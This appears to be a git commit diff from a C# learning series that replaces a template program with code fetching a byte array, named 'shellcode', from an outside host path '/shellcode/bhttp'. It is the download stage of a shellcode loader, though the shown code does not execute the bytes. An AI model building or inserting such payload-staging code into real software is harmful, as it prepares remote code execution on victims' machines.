871401a7495c6b5f18875c073b129677229e0066
incendiary <a.horsewood@googlemail.com>
2023-06-22 16:43:20 +0800

    adding in downloading files

--- Csharp/100 Downloading Files/Download Files/Download Files/Program.cs
+++ Csharp/100 Downloading Files/Download Files/Download Files/Program.cs
@@ -1,3 +1,19 @@
-﻿// See https://aka.ms/new-console-template for more information
-Console.WriteLine("Hello, World!");
+﻿using System;
+using System.Net.Http;
+using System.Threading.Tasks;
 
+namespace DownloadFile
+{
+    internal class Program
+    {
+        static async Task Main(string[] args)
+        {
+            byte[] shellcode;
+            using (var client = new HttpClient())
+            {
+                client.BaseAddress = new Uri("https://www.infinity-bank.com");
+                shellcode = await client.GetByteArrayAsync("/shellcode/bhttp");
+            }
+        }
+    }
+}
